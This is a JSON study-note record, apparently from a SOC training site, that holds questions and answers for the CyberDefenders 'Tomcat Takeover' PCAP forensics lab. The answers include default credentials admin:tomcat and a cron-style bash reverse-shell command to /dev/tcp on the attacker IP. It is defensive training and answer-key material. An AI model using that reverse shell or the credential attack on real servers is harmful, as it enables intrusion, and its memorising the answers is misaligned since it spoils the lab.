@@ -1,0 +1,137 @@
+{
+  "id": "network analysis labs/tomcat takeover (cyberdefenders)",
+  "title": "Tomcat Takeover (CyberDefenders)",
+  "slug": "tomcat-takeover-cyberdefenders",
+  "relPath": "Network Analysis Labs/Tomcat Takeover (CyberDefenders).md",
+  "level": "L2",
+  "curriculumLevelId": "l2",
+  "curriculumSectionId": "l2-attack-vectors",
+  "curriculumSectionTitle": "Advanced Attack Vectors & Internals",
+  "tags": [
+    "Network",
+    "Web",
+    "Persistence"
+  ],
+  "mitre": [],
+  "parentId": "network analysis labs",
+  "children": [],
+  "relatedLinks": [],
+  "backlinks": [
+    "network analysis labs"
+  ],
+  "breadcrumbs": [
+    {
+      "id": "network analysis labs",
+      "title": "Network Analysis Labs",
+      "slug": "network-analysis-labs"
+    },
+    {
+      "id": "network analysis labs/tomcat takeover (cyberdefenders)",
+      "title": "Tomcat Takeover (CyberDefenders)",
+      "slug": "tomcat-takeover-cyberdefenders"
+    }
+  ],
+  "headings": [
+    {
+      "level": 1,
+      "text": "Tomcat Takeover (CyberDefenders)"
+    },
+    {
+      "level": 1,
+      "text": "Scenario"
+    },
+    {
+      "level": 3,
+      "text": "Q1: Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?"
+    },
+    {
+      "level": 3,
+      "text": "14.0.0.120"
+    },
+    {
+      "level": 3,
+      "text": "Q2: Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?"
+    },
+    {
+      "level": 3,
+      "text": "China"
+    },
+    {
+      "level": 3,
+      "text": "Q3: From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?"
+    },
+    {
+      "level": 3,
+      "text": "8080"
+    },
+    {
+      "level": 3,
+      "text": "Q4: Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?"
+    },
+    {
+      "level": 3,
+      "text": "gobuster"
+    },
+    {
+      "level": 3,
+      "text": "Q5: After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?"
+    },
+    {
+      "level": 3,
+      "text": "/manager"
+    },
+    {
+      "level": 3,
+      "text": "Q6: After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?"
+    },
+    {
+      "level": 3,
+      "text": "admin:tomcat"
+    },
+    {
+      "level": 3,
+      "text": "Q7: Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?"
+    },
+    {
+      "level": 3,
+      "text": "JXQOZY.war"
+    },
+    {
+      "level": 3,
+      "text": "Q8: After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?"
+    },
+    {
+      "level": 3,
+      "text": "/bin/bash -c 'bash -i & /dev/tcp/14.0.0.120/443 0&1’"
+    }
+  ],
+  "overview": "The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they have captured network traffic for analysis. The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server. Your task is to analyze the PCAP file to understand the scope",
+  "study": {
+    "overview": "The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they have captured network traffic for analysis. The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server. Your task is to analyze the PCAP file to understand the scope",
+    "whySoc": "Use this note as an analyst reference: understand the concept, identify the relevant telemetry, pivot through evidence, and document the decision path clearly.",
+    "keyConcepts": [
+      "Tomcat Takeover (CyberDefenders)",
+      "Scenario",
+      "Q1: Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?",
+      "14.0.0.120",
+      "Q2: Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?",
+      "China",
+      "Q3: From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?",
+      "8080",
+      "Q4: Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?",
+      "gobuster",
+      "Q5: After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?",
+      "/manager"
+    ],
+    "workflow": [
+      "Identify the user, host, process, network flow, or identity object involved.",
+      "Collect the highest-value logs first and preserve timestamps and assumptions.",
+      "Pivot through related notes, telemetry sources, and MITRE references.",
+      "Document findings, gaps, containment options, and detection improvements."
+    ],
+    "splunkExamples": [],
+    "importantCommands": [],
+    "tools": [],
+    "tips": []
+  }
+}
